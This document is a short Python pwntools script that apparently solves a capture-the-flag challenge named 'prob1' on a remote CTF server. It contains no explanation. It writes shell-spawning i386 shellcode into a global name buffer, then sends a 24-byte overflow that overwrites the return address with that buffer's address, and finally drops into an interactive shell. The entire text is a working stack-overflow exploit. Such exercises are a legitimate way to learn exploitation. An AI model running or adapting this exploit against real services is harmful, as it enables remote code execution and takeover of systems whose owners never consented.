from pwn import *

#context.log_level = 'DEBUG'

e = ELF("./prob1")
#p = process("./prob1")
r = remote("ctf.j0n9hyun.xyz", 3003)

shellcode = shellcraft.i386.linux.sh()
name = 0x804a060

payload1 = ''
payload1 += asm(shellcode)
r.recvuntil("Name : ")
r.sendline(payload1)

r.recvuntil("input : ")
payload2 = ''
payload2 += "A"*24
payload2 += p32(name)
r.sendline(payload2)

r.interactive()
